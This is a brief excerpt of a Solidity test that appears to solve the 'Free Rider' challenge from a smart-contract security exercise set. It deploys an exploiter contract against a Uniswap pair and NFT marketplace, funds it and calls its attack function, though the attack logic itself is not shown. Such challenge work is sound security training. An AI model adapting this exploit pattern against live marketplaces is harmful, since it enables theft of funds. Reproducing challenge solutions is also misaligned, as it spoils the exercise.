...
contract FreeRiderChallenge is Test {
    ...
    function test_freeRider() public checkSolvedByPlayer {
        FreeRiderExploiter freeRiderExploiter = new FreeRiderExploiter(
            address(uniswapPair),
            address(marketplace),
            address(weth),
            address(nft),
        ...
        // send 0.1 ETH from player to attack contract
        address(freeRiderExploiter).call{value: PLAYER_INITIAL_ETH_BALANCE}("");

        freeRiderExploiter.attack();
    }
